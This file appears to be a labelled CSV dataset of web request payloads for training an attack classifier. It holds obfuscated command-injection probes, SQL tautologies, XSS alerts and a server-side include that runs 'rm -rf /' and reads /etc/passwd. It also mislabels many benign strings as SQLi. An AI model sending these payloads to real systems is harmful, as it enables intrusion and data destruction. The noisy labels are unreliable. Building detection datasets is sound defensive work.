payload,label,source
8FAE05EEF0B8C1DA7D19F199AEF4F181,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"--WebKitFormBoundary47219
Content-Disposition: form-data; name=""q""

%22%0A%20str%3D%24%28echo%20HFODHQ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23
--WebKitFormBoundary47219--",CMD,obfuscation:multipart_boundary_sim
Pr�jano,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1nIqUi0Ar,Normal,csic_gsi:cisc_normalTraffic_test.txt
4729782329FD83369596A43387224BC6,Normal,csic_gsi:cisc_normalTraffic_test.txt
50691,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2526echo%24IFSXOUJEA%24%28%2842%252B77%29%29%24%28echo%24IFSXOUJEA%29XOUJEA%2527,CMD,obfuscation:url_encode
IdA=1,SQLi,obfuscation:case_random
eval(atob('QUVDOUVCNzdFMDgzQUM2OTg3OUMzODZGMjAwQzA2Nzg=')),SQLi,obfuscation:base64_fragment
88865484Q,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('QkM1OTQ5MjQ2NDNEQkYwMTg3OTA5QkVBQjhFODEyNTY=')),SQLi,obfuscation:base64_fragment
||echo%20BDZWWB$((16%2B92))$(echo%20BDZWWB)BDZ%00WWB%5C%5C,CMD,obfuscation:null_byte
id=bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org&nombre=Vino+Rioja&precio=85&cantidad=73&B1=A�adir+al+carrito,XSS,csic_gsi:cisc_anomalousTraffic_test.txt
46870,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20QOFXCY%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,SQLi,community:payloads_seed
12225' OR '1'='1,SQLi,obfuscation:logic_or_tautology
eval(atob('Qjc5MTE2NjFFNjNGQzFCNzhGQUE3OTQyQzgxMEREQTc=')),SQLi,obfuscation:base64_fragment
51315671AB2F581EAB964CB%008F373A6CE,SQLi,obfuscation:null_byte
%22echo%20QDLIQI$((19%2B0))$(echo%20QDLIQI)QDLIQI,CMD,seclists_cmd
ma�ea0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%2526%2526echo%2524IFSMMQAGA%2524%2528%252877%25252B46%2529%2529%2524%2528echo%2524IFSMMQAGA%2529MMQAGA%2526,CMD,obfuscation:double_url_encode
id=1&id=59B3D2AB8A7358E06B5259CF37B22398,SQLi,obfuscation:hpp_duplicate_param
FedeLIa,SQLi,obfuscation:case_random
modo%3Dinsertar%26precio%3D9457%26B1A%3DPasar%2Bpor%2Bcaja,SQLi,obfuscation:url_encode
vaｌ�,SQLi,obfuscation:unicode_normalization
A1F6681A94D1059E4CA2085F3830C4C7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"CONCAT(CHAR(49),CHAR(55),CHAR(54),CHAR(49))",SQLi,obfuscation:char_function
%22%26%26echo%20FXN%00WMX$((79%2B34))$(echo%20FXNWMX)FXNWMX%27,CMD,obfuscation:null_byte
modo=insertar&precio=8171&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_train.txt
C26809175AB1BE7F91657D80590D0568,Normal,csic_gsi:cisc_normalTraffic_test.txt
"--WebKitFormBoundary90581
Content-Disposition: form-data; name=""q""

%3B%20str%3D%24%28echo%20PMPVHC%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527
--WebKitFormBoundary90581--",CMD,obfuscation:multipart_boundary_sim
'echo%20NIXAXB$((47%2B23))$(echo%20NIXA%00XB)NIXAXB%7C,CMD,obfuscation:null_byte
"{""a"":{""b"":""71074EFD2D5FD99CC592A01B582F0176""}}",SQLi,obfuscation:json_nested_escape
42120,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%0A%20sｔr%3D%24%28echo%20SYNSAC%29%0A%20ｓtr1%3D%24%7B%23ｓtr%7D%0A%20ｉf%20%5B%202%20-ｎe%20%24%7Bｓｔr1%7D%20%5D%0A%20thｅｎ%20sleｅp%200%0A%20ｅｌse%20ｓｌｅｅp%201%0A%20fｉ%20%2527,CMD,obfuscation:unicode_normalization
RIbes+dE+fRESeR,SQLi,obfuscation:case_random
%2527%2529print%2528%2560echo%252520EXVUXJ%255Cnecho%252520%2524%2528%252873%25252B54%2529%2529%255Cnecho%252520EXVUXJ%255Cnecho%252520EXVUXJ%2560%2529%25253BEXVUXJ,CMD,obfuscation:double_url_encode
LarIs+uLL,SQLi,obfuscation:case_random
9CBd20Ad61607bAD19Df166750882D2f,SQLi,obfuscation:case_random
Castellv�+de+Rosanes,Normal,csic_gsi:cisc_normalTraffic_test.txt
01fa0eFeb25cCdd073F0B0343BaF0F1f,SQLi,obfuscation:case_random
528%0064416C,SQLi,obfuscation:null_byte
5F156C94BBD895A1DFADCD261BA8E29F,Normal,csic_gsi:cisc_normalTraffic_test.txt
I%00an,SQLi,obfuscation:null_byte
A13Ca681fD1ca9097e106ff8f7A3d198,SQLi,obfuscation:case_random
B6CADC0F8769EFFE86D66C356C752059,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20TSUCKA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22,CMD,seclists_cmd
%3Becho$IFSMKSRXM$((30%2B1%009))$(echo$IFSMKSRXM)MKSRXM|,CMD,obfuscation:null_byte
"""%20echｏ%20GEWHYE$((65%2B76))$(ｅchｏ%20GEWHYE)GEWHYE\",CMD,obfuscation:unicode_normalization
eval(atob('Z2FsbHV6emk=')),SQLi,obfuscation:base64_fragment
2%20,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2529print%2528%2560echo%252520HQNHAD%25250aecho%252520%2524%2528%252891%25252B64%2529%2529%25250aecho%252520HQNHAD%25250aecho%252520HQNHAD%2560%2529%25253BHQNHAD,CMD,obfuscation:double_url_encode
92887AC8B2683CCCB8C1D757E2671899,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%204%20-\u006ee%20%24%28e\u0063h\u006f%20K\u0058\u004cYID%20%7C%20\u0074\u0072%20-d%20%27%5C\u006e%27%20%7\u0043%20\u0077\u0063%20-c%29%20%5D%20%7\u0043%7\u0043%20\u0073\u006ce\u0065p%201%20%2526,CMD,obfuscation:unicode_escape
%22%0A%20sｔr%3D%24%28echｏ%20PSDLXW%29%0A%20ｓtr1%3D%24%7B%23ｓtr%7D%0A%20if%20%5B%205%20-nｅ%20%24%7Bstr1%7D%20%5D%0A%20ｔhｅn%20ｓｌｅｅp%200%0A%20elsｅ%20ｓｌeep%201%0A%20fi%20%7C,CMD,obfuscation:unicode_normalization
Bald�+Almansa,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"{""a"":{""b"":""39587""}}",SQLi,obfuscation:json_nested_escape
"CONCAT(CHAR(56),CHAR(55),CHAR(51),CHAR(53),CHAR(49),CHAR(55),CHAR(57),CHAR(55),CHAR(77))",SQLi,obfuscation:char_function
id=1&id=Graupera+Huaranca,SQLi,obfuscation:hpp_duplicate_param
"--WebKitFormBoundary37856
Content-Disposition: form-data; name=""q""

%2527%7C%20%5B%206%20-ne%20%24%28echo%20SBHMIY%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C
--WebKitFormBoundary37856--",CMD,obfuscation:multipart_boundary_sim
%0A%20Str%3D%24%28EchO%20DplQyS%29%0a%20stR1%3d%24%7B%23StR%7D%0a%20If%20%5B%209%20-Ne%20%24%7bStr1%7d%20%5d%0a%20then%20SLeep%200%0A%20ElsE%20SlEep%201%0A%20fi%20%22,CMD,obfuscation:case_random
2d20a8567514E47C31eb0Ea2F792a57a,SQLi,obfuscation:case_random
MilLaNes,SQLi,obfuscation:case_random
"e\u0072\u0072\u006fr\u004dsg=','0','0');\u0077\u0061itf\u006f\u0072+\u0064\u0065\u006c\u0061y+'0:0:15';--",SQLi,obfuscation:unicode_escape
9F5FA3F3BE8F084AAC2097B2FC88D38B' OR '1'='1,SQLi,obfuscation:logic_or_tautology
82F24F39E9C4A1A152155E7AE559CE08,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0aecho%20HNNUGD$((25%2B95))$(echo%20HNNUGD)HNNUGD\,CMD,seclists_cmd
"--WebKitFormBoundary46550
Content-Disposition: form-data; name=""q""

667BCC762881ACE6AE595222FCE8C98A
--WebKitFormBoundary46550--",SQLi,obfuscation:multipart_boundary_sim
4002449133288786' OR '1'='1,SQLi,obfuscation:logic_or_tautology
4Fd94A17c83C43b7C02a41Fa54440078,SQLi,obfuscation:case_random
%252526%252520sleep%2525200%252520%252526%252526%252520str%25253D%252524%252528echo%252520ZEPVFU%252529%252520%252526%252526%252520str1%25253D%252524%25257B%252523str%25257D%252520%252526%252526%252520%25255B%2525209%252520-eq%252520%252524%25257Bstr1%25257D%252520%25255D%252520%252526%252526%252520sleep%2525201%252520%25252527,CMD,obfuscation:double_url_encode
D%00el+Blanco,SQLi,obfuscation:null_byte
A84AAAF26BC34A1F4EEC5110BE4097A8,Normal,csic_gsi:cisc_normalTraffic_train.txt
85A5D2B3D70A3062BD13A1EF35C8965C' OR '1'='1,SQLi,obfuscation:logic_or_tautology
id=1&id=65AFDCED2F4579F3E01D846E7CC6D79B,SQLi,obfuscation:hpp_duplicate_param
%253B%2520str%253D%2524%2528echo%2520TSXSCX%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25202%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%25255C%25255C,CMD,obfuscation:url_encode
4F384E95EEFB3B965070588D7B3EE74F,Normal,csic_gsi:cisc_normalTraffic_train.txt
394A1D1B0BD66D2F3071946E5C0DFCD8/*--*/,SQLi,obfuscation:nested_comment
4106D\u00416D32C982C6\u00415177DB2028154B0,SQLi,obfuscation:unicode_escape
D923B44A5066CE71EBECDC34433E4E85,Normal,csic_gsi:cisc_normalTraffic_test.txt
varEnNes@sO-tel.Ni,SQLi,obfuscation:case_random
%22&&echｏ$IFSZDMIIV$((60%2B55))$(ｅchｏ$IFSZDMIIV)ZDMIIV%5C%5C,CMD,obfuscation:unicode_normalization
27sa2ma5ame3te,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%26%20sleep%200%20%26%26%20str%00%3D%24%28echo%20OLUGPB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%22,CMD,obfuscation:null_byte
%257C%2520%255B%25202%2520-ne%2520%2524%2528echo%2520CXWPXJ%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%25255C%25255C,CMD,obfuscation:url_encode
print(`echo%20PFLDED;echo%20$((95%2%00B99));echo%20PFLDED;echo%20PFLDED`)%3B.%2527PFLDED,CMD,obfuscation:null_byte
Galobard+Garros,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('QzUzMUJEQTBEMDE2RTQyMURCNzg4Q0IzMjYyMUIzNjA=')),SQLi,obfuscation:base64_fragment
E5CF12E369213F71D0CBB5C41BCFB065,Normal,csic_gsi:cisc_normalTraffic_train.txt
&echo%20WT%00DJVU$((89%2B9))$(echo%20WTDJVU)WTDJVU%7C,CMD,obfuscation:null_byte
%2527%3B%20sTR%3D%24%28ECHo%20iitgSD%29%3b%20stR1%3D%24%7b%23STR%7D%3B%20If%20%5b%202%20-ne%20%24%7Bstr1%7d%20%5D%3B%20THeN%20slEEP%200%3b%20ElsE%20SlEep%201%3b%20fi%20%26,CMD,obfuscation:case_random
998E1AC51F68D58D7D1ED067C6374FF0' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"{""a"":{""b"":""F8AEDCFBF5F8B3105463DA886B5B13C6""}}",SQLi,obfuscation:json_nested_escape
id=1&id=F613725F9B4EB0C31B24B1AB59844A4F,SQLi,obfuscation:hpp_duplicate_param
RAmAd�n,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"{""a"":{""b"":""Malaqu�as""}}",SQLi,obfuscation:json_nested_escape
ScHALl@AnDREsTABErNErO.fJ,SQLi,obfuscation:case_random
eval(atob('JTNCJTIwc3RyJTNEJTI0JTI4ZWNobyUyMEpIQUFURCUyOSUzQiUyMA=='))str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,CMD,obfuscation:base64_fragment
"--WebKitFormBoundary72020
Content-Disposition: form-data; name=""q""

spearman
--WebKitFormBoundary72020--",SQLi,obfuscation:multipart_boundary_sim
drier@hotelesymas.cl,Normal,csic_gsi:cisc_normalTraffic_train.txt
F7251D8cEF43293AbA966168b6ef9594,SQLi,obfuscation:case_random
D1A9C9DCCBE5928DAA68D4A0B7C2150F,Normal,csic_gsi:cisc_normalTraffic_train.txt
|ECHo%20sshUWu$((85%2B62))$(EchO%20sSHuwu)SshUwU%27,CMD,obfuscation:case_random
CFB511F1CDD90C4CE575398E4EDB71D2,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%7Ce\u0063\u0068\u006f%20\u0054\u0045D\u004aV\u0043$((96%2B45))$(\u0065c\u0068o%20T\u0045DJVC)TE\u0044\u004a\u0056\u0043%22,CMD,obfuscation:unicode_escape
ventr�%00n,SQLi,obfuscation:null_byte
eval(atob('JTNCZWNobyUyMFdKUk5QSCQoKDElMkIxNSkpJChlY2hvJTIwV0pSTg=='))PH)WJRNPH',CMD,obfuscation:base64_fragment
id=1&id=B2=%7C,SQLi,obfuscation:hpp_duplicate_param
"CONCAT(CHAR(57),CHAR(50),CHAR(50),CHAR(51),CHAR(48),CHAR(56),CHAR(54),CHAR(56),CHAR(86))",SQLi,obfuscation:char_function
%0\u0041%20st\u0072%3\u0044%24%28e\u0063\u0068o%20K\u0054BJHD%29%0\u0041%20\u0073tr1%3D%24%7\u0042%23\u0073t\u0072%7\u0044%0A%20\u0069\u0066%20%5\u0042%208%20-\u006e\u0065%20%24%7\u0042st\u00721%7\u0044%20%5D%0A%20\u0074hen%20s\u006c\u0065e\u0070%200%0\u0041%20\u0065\u006c\u0073e%20s\u006c\u0065ep%201%0A%20fi%20%255C%255\u0043,CMD,obfuscation:unicode_escape
eval(atob('JTdDJTIwJTVCJTIwMiUyMC1uZSUyMCUyNCUyOGVjaG8lMjBOWUtWSw=='))X%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,obfuscation:base64_fragment
%7C%7Cecho$IFSEJZUFX$((9%2B88))$(echo$IFSEJZUFX)EJZUFX|,CMD,seclists_cmd
youngman' OR '1'='1,SQLi,obfuscation:logic_or_tautology
eval(atob('bW9kbz1yZWdpc3RybyZsb2dpbj1hcm5vbGQmcGFzc3dvcmQ9NW5hLg=='))0m7gR5D2&nombre=Marcelino&apellidos=Conill+Crous&email=figueras-haufrect@freetag.no&dni=72263814E&direccion=C/+Catalanes+84+13E&ciudad=Talamanca&cp=26573&provincia=Soria&ntc=9766753613033509&B1A=Registrar,SQLi,obfuscation:base64_fragment
"--WebKitFormBoundary18990
Content-Disposition: form-data; name=""q""

0512E8A9C5CB874BA6236CD984283DAC
--WebKitFormBoundary18990--",SQLi,obfuscation:multipart_boundary_sim
Santamaria+Molt�' OR '1'='1,SQLi,obfuscation:logic_or_tautology
91076650p,SQLi,obfuscation:case_random
%2527%7C%20%5B%201%20-ｎe%20%24%28echo%20FMCMJN%20%7C%20ｔr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sｌeep%201%20%26,CMD,obfuscation:unicode_normalization
0E89996B4A50B30423FD711D2ED50BE2,Normal,csic_gsi:cisc_normalTraffic_test.txt
A6752467E3A08EF535B82668C04DB89E,Normal,csic_gsi:cisc_normalTraffic_test.txt
"CONCAT(CHAR(102),CHAR(97),CHAR(121),CHAR(101),CHAR(116),CHAR(116),CHAR(101))",SQLi,obfuscation:char_function
%2522%3B%20\u0073\u0074\u0072%3\u0044%24%28echo%20\u0049VNS\u0042H%29%3B%20\u0073\u0074r1%3\u0044%24%7B%23s\u0074\u0072%7D%3B%20if%20%5\u0042%204%20-ne%20%24%7\u0042s\u0074r1%7\u0044%20%5\u0044%3B%20\u0074\u0068e\u006e%20\u0073\u006c\u0065e\u0070%200%3B%20e\u006cse%20sle\u0065p%201%3B%20\u0066\u0069%20%2522,CMD,obfuscation:unicode_escape
eval(atob('JTI1MjIlN0MlMjAlNUIlMjA3JTIwLW5lJTIwJTI0JTI4ZWNobyUyMA=='))GZCIAW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,obfuscation:base64_fragment
eval(atob('JTI3JTI2JTI2ZWNobyUyMFZZUk1JTCQoKDQyJTJCNjYpKSQoZWNobw=='))%20VYRMIL)VYRMIL%27,CMD,obfuscation:base64_fragment
14AEFA8A1DFBF7751751C71E1BEA596E,Normal,csic_gsi:cisc_normalTraffic_test.txt
A026C3F66F88640FEF741B854C7C9B88,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo%253Dregistro%2526login%253Dedyth%2526password%253DdEsafUCiA%253F%252FR%2526nombre%253DJovito%2526apellidos%253DRibet%2526email%253Dgunderson_sefton1%2540stainless.au%2526dni%253D06675230D%2526direccion%253DC%252F%252BVerdolaga%252B125%252B%2526ciudad%253DMazarr%25EF%25BF%25BDn%2526cp%253D03360%2526provincia%253DA%252BCoru%25EF%25BF%25BDa%2526ntc%253D0722661121783236%2526B1%253DRegistrar,SQLi,obfuscation:double_url_encode
%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520STITDI%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25206%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2522,CMD,obfuscation:url_encode
Print(`ECho%20PflDeD;ecHo%20$((95%2B99));EcHO%20pFlDeD;ecHO%20pflDeD`)%3B.%2527pFlDeD,CMD,obfuscation:case_random
2E26452B3339318B222AD0D64B9D9D86,Normal,csic_gsi:cisc_normalTraffic_train.txt
"""%7\u0043e\u0063\u0068o%20\u0058\u0054L\u004c\u0044X$((25%2\u004220))$(echo%20\u0058TL\u004c\u0044X)\u0058\u0054L\u004cDX\",CMD,obfuscation:unicode_escape
eval(atob('JTIyJTdDJTIwJTVCJTIwOCUyMC1uZSUyMCUyNCUyOGVjaG8lMjBCTA=='))TNIK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,CMD,obfuscation:base64_fragment
"{""a"":{""b"":""A83EBC9B4F9AFD4D059B386796EB6215""}}",SQLi,obfuscation:json_nested_escape
"{""a"":{""b"":""id=1&nombre=Vino+Rioja&precio=39&cantidadA=80&B1=A�adir+al+carrito""}}",SQLi,obfuscation:json_nested_escape
7A549C27149672F17CC2D118C%00316958B,SQLi,obfuscation:null_byte
613D9BD1BC02287DF%0057E84A81DE302AF,SQLi,obfuscation:null_byte
"modo=registro&login=cara&password=acarraScaD0&nombre=E+mir&apellidos=Cedr�s+Vega&email=heselwood@gopersonaltrainers.ke&dni=18457064R&direccion=Camino+Santa+Marina,+185+5?A&ciudad=Gargantilla+del+Lozoya+y+Pinilla+de+Buitrago&cp=50109&provincia=Segovia&ntc=5320703889468168&B1=Registrar/*--*/",SQLi,obfuscation:nested_comment
%25253B%252520str%25253D%252524%252528echo%252520APHWVY%252529%25253B%252520str1%25253D%252524%25257B%252523str%25257D%25253B%252520if%252520%25255B%2525208%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25253B%252520then%252520sleep%2525200%25253B%252520else%252520sleep%2525201%25253B%252520fi%252520,CMD,obfuscation:double_url_encode
7C03CAE52AA528A1D4CD90B7CEC32C55,Normal,csic_gsi:cisc_normalTraffic_test.txt
'|echo%20ZMCCDQ$((18%2B56))$(echo%20ZMCCDQ)ZMCC%00DQ//,CMD,obfuscation:null_byte
M�zquiz+Metauten,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('RDM3MzNEOThFNEQ5NkVENkNGMDQyOTQ2MjVFQzQ0QkU=')),SQLi,obfuscation:base64_fragment
%25252527%25257C%252520%25255B%2525203%252520-ne%252520%252524%252528echo%252520IQYBMK%252520%25257C%252520tr%252520-d%252520%252527%25255Cn%252527%252520%25257C%252520wc%252520-c%252529%252520%25255D%252520%25257C%25257C%252520sleep%2525201%252520%25257C,CMD,obfuscation:double_url_encode
"{""a"":{""b"":""30EE6838D4F65E4C28014E8A168C7628""}}",SQLi,obfuscation:json_nested_escape
A64273DBF69DEFA5800DA799A4DD722%001,SQLi,obfuscation:null_byte
02329,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('cmljY2l0ZWw=')),SQLi,obfuscation:base64_fragment
|echo%20SVSMOA$((21%%002B73))$(echo%20SVSMOA)SVSMOA%7C,CMD,obfuscation:null_byte
Tonk+Carrizales,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8319637256237029/*--*/,SQLi,obfuscation:nested_comment
"mODO=iNSErtAr&pREcIo=1202<!--#ExEc+cMd=""RM+-rf+/;cAt+/etC/pAsSWD""+-->&b1=PaSaR+poR+CajA",PathTraversal,obfuscation:case_random
C24F5B7FE16B490E35141BD3EEE38D49,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=7233any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235&B1=Confirmar/*--*/,SQLi,obfuscation:nested_comment
r%00equeridor%00,SQLi,obfuscation:null_byte
"--WebKitFormBoundary69734
Content-Disposition: form-data; name=""q""

1972
--WebKitFormBoundary69734--",SQLi,obfuscation:multipart_boundary_sim
modo%3Dregistro%26login%3Dshutterb%26password%3D4ntorchar%26nombre%3DNoam%26apellidos%3DSamper%2BFolco%26email%3Dmenant%40venderfotografias.se%26dni%3D33151406B%26direccion%3DCalle%2BAladierna%2C%2B85%2B3%3FA%26ciudad%3DBuruj%EF%BF%BDn%26cp%3D28648%26provincia%3DBarcel%3Fona%26ntc%3D1260473774275985%26B1%3DRegistrar,SQLi,obfuscation:url_encode
%2522%7C%20%5B%203%2%000-ne%20%24%28echo%20NREISI%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,obfuscation:null_byte
F64E57C48AA3F9C258CD2F0603C136%001F,SQLi,obfuscation:null_byte
errorMsg=Credenciales+incorrectas%00,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5832/*--*/,SQLi,obfuscation:nested_comment
"{""a"":{""b"":""8633F5469A99A73D12526297761DCDD5""}}",SQLi,obfuscation:json_nested_escape
3CFC8E020478EDEC711F242307834C46,Normal,csic_gsi:cisc_normalTraffic_test.txt
%252522%250A%2520str%253D%2524%2528echo%2520ZLOWUA%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25207%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%25257C,CMD,obfuscation:url_encode
id=1&id=AC994F89D6EA75AD8029D77372DF86DE,SQLi,obfuscation:hpp_duplicate_param
h61�ng19a,Normal,csic_gsi:cisc_normalTraffic_train.txt
692ED6AB8CAAD071EEF3F618F9C15F74,Normal,csic_gsi:cisc_normalTraffic_train.txt
16052504E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Baldui%00no,SQLi,obfuscation:null_byte
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20QHSDUY%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,CMD,seclists_cmd
Am�lcar,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=1&id=modo=entrar&login=sambo&pwd=*insu6u8abl3&remember=on&B1A=Entrar,SQLi,obfuscation:hpp_duplicate_param
%25257C%252520%25255B%2525207%252520-ne%252520%252524%252528echo%252520JJZSID%252520%25257C%252520tr%252520-d%252520%252527%25255Cn%252527%252520%25257C%252520wc%252520-c%252529%252520%25255D%252520%25257C%25257C%252520sleep%2525201%252520%25255C%25255C,CMD,obfuscation:double_url_encode
B2=Vaciar+carrito%3CS'+'C'+'R'+'I'+'P'+'T%3Ea'+'l'+'e'+'r'+'t%28%22Paros%22%29%3B%3C%2FS'+'C'+'R'+'I'+'P'+'T%3E,SQLi,obfuscation:keyword_concat_split
%7c%20%5b%206%20-Ne%20%24%28eChO%20CsMWFn%20%7C%20tr%20-d%20%27%5cn%27%20%7c%20wC%20-C%29%20%5d%20%7c%7c%20SLeep%201%20%7C,CMD,obfuscation:case_random
qerimi@graficascamp.bt,Normal,csic_gsi:cisc_normalTraffic_train.txt
"<META HTTP-EQUIV=""Link"" Content=""<javascript:alert('XSS')>; REL=stylesheet"">",XSS,community:payloads_seed
%7C%20%5B%209%20-ne%20%24%28echo%20HHUNZT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
1%25253F,SQLi,obfuscation:double_url_encode
%7C%20%5b%205%20-ne%20%24%28echo%20PaRklW%20%7C%20tr%20-d%20%27%5cn%27%20%7c%20Wc%20-C%29%20%5d%20%7c%7c%20SleEP%201%20//,CMD,obfuscation:case_random
1\u00466967268E8236\u0046B5C701954D\u0043\u00463\u0042\u0043D5,SQLi,obfuscation:unicode_escape
'|echｏ$IFSBTCBHW$((54%2B8))$(ｅchｏ$IFSBTCBHW)BTCBHW,CMD,obfuscation:unicode_normalization
"--WebKitFormBoundary68015
Content-Disposition: form-data; name=""q""

28010640K
--WebKitFormBoundary68015--",SQLi,obfuscation:multipart_boundary_sim
%22%0A%20sｔr%3D%24%28echo%20WMHOZP%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ｎｅ%20%24%7Bstr1%7D%20%5D%0A%20ｔhｅn%20ｓｌeep%200%0A%20elｓe%20ｓｌeep%201%0A%20fｉ%20%255C%255C,CMD,obfuscation:unicode_normalization
BEA98%00462DEC3EF7734D7D844FCD234ED,SQLi,obfuscation:null_byte
2FD4FED00E10E695C6870E6C9C226F5F,Normal,csic_gsi:cisc_normalTraffic_test.txt
&eCHO%20ZmZtLJ$((97%2B61))$(ECho%20ZMztlJ)zMZTlj%26,CMD,obfuscation:case_random
"CONCAT(CHAR(71),CHAR(114),CHAR(97),CHAR(110),CHAR(65533),CHAR(115),CHAR(43),CHAR(67),CHAR(97),CHAR(98),CHAR(101),CHAR(122),CHAR(111),CHAR(110))",SQLi,obfuscation:char_function
cAreRa,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
